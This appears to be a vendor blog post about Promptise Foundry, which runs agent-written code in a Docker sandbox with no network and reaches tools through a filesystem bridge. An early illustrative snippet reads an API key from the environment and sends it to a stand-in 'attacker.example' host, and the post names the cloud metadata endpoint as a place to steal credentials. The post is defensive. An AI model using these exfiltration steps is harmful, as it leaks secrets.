---
title: "Can Your Agent Exfiltrate Data? Sandboxing Code With No Network"
description: "A code-writing agent with network access can quietly POST your data anywhere. The honest problem: most sandboxes force a trade-off — leave egress on (and…"
keywords: "sandbox agent code with no network, prevent agent data exfiltration, no-network code sandbox, run AI-generated code safely"
date: 2026-07-16
slug: sandbox-agent-code-with-no-network
categories:
  - Sandboxing
---

# Can Your Agent Exfiltrate Data? Sandboxing Code With No Network

To **sandbox agent code with no network** is the single highest-leverage control you can put between a code-writing agent and a data breach — because a program with an open socket doesn't need a bug to exfiltrate your data, it just needs a plausible-looking line the model was talked into writing. A code interpreter that "does some math" also has your process's network stack, and one `urllib.request.urlopen` turns a local read into a POST to `attacker.example`. Cutting the egress is obvious. The reason teams don't is subtler, and it's the honest problem this post is about: for most sandboxes, cutting the network also cuts the program off from the very tools it exists to use. This is how Promptise Foundry breaks that trade-off — `NetworkMode.NONE`, auto-set for the code-action pattern, where the isolated program's only reach to the outside world is your tools, invoked over a filesystem bridge that needs no network at all.

<!-- more -->

## The exfiltration path hiding in your code interpreter

When an agent writes and runs Python "in-process," it runs inside the interpreter that runs your service. The code inherits your process: the same user id, the same environment block, and — the part that matters here — the same network stack. That last inheritance is what turns a curiosity into an incident.

Walk the sequence. A generated snippet reads `os.environ` (your `OPENAI_API_KEY`, your `DATABASE_URL`, the cloud IAM credentials your orchestrator injected). On its own that's a local read. But an in-process interpreter has full outbound reach, so the next line ships those secrets anywhere:

```python
# Illustrative ONLY — what an in-process REPL can run, not Promptise code.
import os, urllib.request

secret = os.environ.get("OPENAI_API_KEY", "")
urllib.request.urlopen("https://attacker.example/collect?e=" + secret)
```

The network reach is worse than "outbound to the internet," too. It's inbound-adjacent to your internal services — including the cloud metadata endpoint at `169.254.169.254`, which on a misconfigured instance hands back short-lived role credentials. A code snippet that "just does some math" is one request away from assuming your instance role. For the full threat-model walkthrough of what in-process code can reach, see [The Real Risks of Running AI-Generated Code In-Process](risks-of-running-ai-generated-code.md). The takeaway for *this* post is narrower: if the program can open a socket, no amount of filesystem hardening closes the exfiltration path. You have to take the socket away.

## Cutting the network cuts your tools — the false trade-off

So take it away. Run the code in a container with no network. Problem solved?

Not quite — and this is the trade-off nobody puts on the label. The whole reason you let an agent write code is so it can *use your tools*: query the database, hit the internal pricing service, call the MCP server that lists employees. In almost every framework, a tool call is a **network call** — the sandboxed program reaches back out over HTTP or a socket to invoke the tool. So the moment you set the container to `network="none"`, you don't just block `attacker.example`. You block the tool calls too. The program is now perfectly isolated and perfectly useless.

That's the bind teams actually hit. Leave egress on and you accept the exfiltration risk. Cut egress and you sever the program from your tools. Most "run AI-generated code safely" advice quietly picks the first option because the second one breaks the demo. The real fix isn't choosing between isolation and usefulness — it's finding a tool channel that doesn't ride the network at all.

## What other frameworks do today

To be fair and precise: the ecosystem *has* good isolation tooling. The gap is that no-egress and tool-access are treated as opposing settings, not as a default you get together.

- **LangChain `PythonREPLTool` / `PythonAstREPLTool`** run model code in the host process via `exec` — full host network, full `os.environ`. Both ship under `langchain_experimental` and their own docs warn they execute arbitrary code. There's no sandbox here to cut the network *from*; isolation is entirely your job once you adopt the tool.
- **Hosted code sandboxes — e2b, Modal, Riza** — give you a genuine boundary, and tools/imports work inside them. The precise deltas: each is an opt-in service you wire up and send code to, and their sandboxes come with **internet access on by default** (e2b sandboxes have outbound network unless you restrict it). Isolation, yes; no-egress-by-default, no.
- **`langchain-sandbox`** (Deno/Pyodide) is the closest in spirit: it runs code under Deno's permission model, so you *can* pass `allow_net=False` to deny network. That's a real, honest capability. The delta is that it's a permission you must remember to set, and the Pyodide runtime constrains which native libraries the code can use.
- **smolagents `CodeAgent`** executes model-written Python and *does* expose your tools inside its executor — credit where due. But its default `LocalPythonExecutor` runs in your process (a restricted-builtins interpreter, not a network boundary), and its stronger isolation comes from opt-in **remote** executors (e2b/Docker) that reach tools over a network channel. So "no network" and "tools available" pull against each other there too.

The honest summary: other frameworks can sandbox code, and several can cut the network. What none of them make *structural* is the combination — no-egress as the default **and** a tool channel that survives it. Promptise's edge isn't a capability the others lack; it's that we made the safe pairing the path of least resistance instead of two settings you have to reconcile yourself.

## The fix: no egress by default, tools still reachable

In Promptise Foundry the pairing is one argument. `agent_pattern="code-action"` provisions the hardened Docker sandbox, **auto-sets `network="none"`**, and wires the program's tool calls through a **filesystem bridge** — so the isolated program reaches your tools without a single packet leaving the box. The example below is runnable end-to-end: set `OPENAI_API_KEY`, have Docker running, and the model will write *one* program over your tools and execute it with the network off.

```python
import asyncio

from promptise import build_agent
from langchain_core.tools import tool


@tool("list_invoices")
def list_invoices() -> list[str]:
    """Return every invoice id."""
    return ["INV-001", "INV-002", "INV-003"]


@tool("get_invoice")
def get_invoice(invoice_id: str) -> dict:
    """Return {id, region, amount} for one invoice."""
    table = {
        "INV-001": {"id": "INV-001", "region": "EU", "amount": 1200},
        "INV-002": {"id": "INV-002", "region": "US", "amount": 900},
        "INV-003": {"id": "INV-003", "region": "EU", "amount": 750},
    }
    return table[invoice_id]


async def main() -> None:
    # code-action auto-enables the Docker sandbox AND auto-sets network="none".
    # The model writes ONE program that reaches these tools over a filesystem
    # bridge -- no network involved, so egress and tool access don't conflict.
    agent = await build_agent(
        servers={},                       # or your MCP servers
        model="openai:gpt-5-mini",
        agent_pattern="code-action",      # sandbox + network=none, automatically
        extra_tools=[list_invoices, get_invoice],
        instructions="Answer by writing one program over the tools.",
    )

    result = await agent.ainvoke({"messages": [{"role": "user", "content":
        "What is the total amount of every EU invoice?"}]})
    print(result["messages"][-1].content)  # the program lists → looks up → filters → sums

    await agent.shutdown()


asyncio.run(main())
```

The bridge is the whole trick. The generated `promptise_tools.py` turns each of your tools into a stub that writes a request file (`req_<id>.json`) to the writable `/workspace` tmpfs and blocks. A concurrent loop **on the host** sees the request, runs the *real* `BaseTool`, and writes the response (`resp_<id>.json`, plus a `.done` marker so a read never races a partial write). The stub unblocks and hands the value back to the program. The channel is a shared filesystem, not a socket — which is precisely why the sandbox can stay fully network-isolated while the program still queries your database. The mechanics are documented in full in the [code-action guide](../../guides/code-action.md).

Two properties fall out of this that a bolt-on sandbox doesn't give you for free. First, there is **no silent fallback**: `build_agent(agent_pattern="code-action")` raises a clear error if a container can't be initialized, because running model code on the host would be exactly the thing you're avoiding. Second, your tools keep their protections — because each bridged call invokes the real `BaseTool` on the host, an approval gate (`build_agent(..., approval=...)`) still fires on a bridged call, and under the Agent Runtime your budget/health/audit hooks apply per call. Without the runtime, code-action enforces its own hard `max_tool_calls` cap per run (default 50) so a generated program can't loop a tool unbounded.

You don't have to use code-action to get no-egress: `NONE` is the default for every sandbox, so plain `sandbox=True` gets it too. Spelling it out on the general path keeps the intent explicit and greppable. `NetworkMode.NONE` is one of three modes:

| `NetworkMode` | What it allows |
|---|---|
| `NONE` | No network access whatsoever — the default for every sandbox, code-action included |
| `RESTRICTED` | DNS plus outbound TCP 80/443 only, enforced with iptables inside the container (opt-in; the sandbox refuses to start if the image has no `iptables`) |
| `FULL` | Full unrestricted outbound |

```python
# General sandbox path (any agent_pattern): no egress, spelled out explicitly.
agent = await build_agent(
    servers={},
    model="openai:gpt-5-mini",
    sandbox={
        "network": "none",     # maps to NetworkMode.NONE — no route off the box
        "memory_limit": "256M",
        "cpu_limit": 1,
        "timeout": 30,
    },
)
```

Cutting the network is the top layer; the sandbox stacks several more underneath it by default — read-only rootfs, ~40 dropped Linux capabilities, Docker's default seccomp profile, `no-new-privileges`, and CPU/memory/process/time limits. Every knob, plus the optional `gvisor` backend for kernel-level isolation, is in the [sandbox reference](../../core/sandbox.md).

## Proving your agent's code can't phone home

A no-egress claim is worth what you can demonstrate, and with the network mode set to `NONE` the demonstration is short:

- **Ask the agent to try.** Instruct it to write a program that `urlopen`s an external URL, and run it under code-action. The request fails at the container's network layer — there is no interface to reach the internet on — while a bridged tool call in the same program still succeeds. That contrast is the proof: tools work, egress doesn't.
- **Watch the connection table.** Run the code-action example under a network monitor. Outbound connections attributable to the sandboxed container should be zero, because the tool channel is a file on `/workspace`, not a socket.
- **Grep the pattern, not a firewall rule.** Because `network="none"` is a config value on the run rather than an external network policy, "reject any sandbox config whose `network` isn't `none`" is a one-line check you can enforce in CI, per agent — not a cluster-wide rule someone has to remember to attach.

One honest caveat, because it matters for untrusted or multi-tenant input: the bridge is a deliberate capability hole. The containment stops the model's *code* from escaping; it does not make your *tools* safe on its own — a program can call any tool the agent has. Keep the code-action tool set least-privilege, wrap mutating tools with an approval gate, set `max_tool_calls` conservatively, and prefer `sandbox={"backend": "gvisor", "network": "none"}` for kernel-level isolation. The end-to-end operational playbook — dependency pinning, resource sizing, and the rest of the production checklist — is in [How to Run AI-Generated Code Safely: The 2026 Field Guide](run-ai-generated-code-safely.md).

## Frequently asked questions

### How do I sandbox agent code with no network but still let it use my tools?

Use `agent_pattern="code-action"` in `build_agent`. It provisions a hardened Docker sandbox, auto-sets `NetworkMode.NONE`, and routes the program's tool calls through a filesystem bridge (request/response files on the writable `/workspace` tmpfs). The container has no network interface, so the code can't exfiltrate — but it still reaches your tools, because tool calls travel over the shared filesystem, not a socket.

### If the network is off, how does a bridged tool call reach the outside world?

It doesn't reach the outside world directly — the *host* does, on the program's behalf. The sandboxed stub writes a request file and blocks; a loop on the host runs the real `BaseTool` (which may itself query a database or an internal service) and writes the response back into the container. The program only ever touches the filesystem. That indirection is exactly what lets the container stay `network="none"` while the tool still works.

### Does cutting egress mean my agent can't call external APIs at all?

The *program* can't, and that's the point for untrusted code. But any tool you register can — because the tool runs on the host, outside the sandbox, with whatever network access you gave the host process. So the pattern is: the sandbox is airtight, and controlled outbound access lives in your reviewed tools, where you can gate and audit it. If you genuinely need the code itself to have limited outbound reach, use `NetworkMode.RESTRICTED` (DNS plus HTTP/HTTPS only, enforced with iptables, so the image must include `iptables`) instead of `NONE`.

### How is this different from just running code in an isolated sandbox like e2b or smolagents?

Those can isolate code, and smolagents even exposes tools inside its executor — so this isn't about a missing capability. The difference is the default pairing. Hosted sandboxes typically ship with internet on unless you restrict it, and framework sandboxes usually reach tools over a network channel, so `network="none"` breaks tool access. Promptise makes no-egress the **default** for code-action (and every other sandbox) and gives the program a non-network tool bridge, so you don't trade isolation for usefulness.

### What happens if Docker isn't available?

`build_agent(agent_pattern="code-action")` raises a clear error. There is no silent fallback to running model-written code on the host, because that would reintroduce every reach cutting the network was meant to close. The same holds for `sandbox=True` on any agent: if Docker is unavailable, `build_agent` raises instead of building the agent without its sandbox tools.

## Next steps

Set `agent_pattern="code-action"` (which makes `network="none"` the default) or pass `sandbox={"network": "none"}` on the general path, then confirm your agent's code can't phone home by asking it to try and watching the request fail while a tool call succeeds. Start from the [sandbox reference](../../core/sandbox.md) for the full layer-by-layer configuration, read the [code-action guide](../../guides/code-action.md) to understand the filesystem bridge that gives you tool access with no network, and pair it with [The Real Risks of Running AI-Generated Code In-Process](risks-of-running-ai-generated-code.md) for the threat model the no-egress default is built to close.
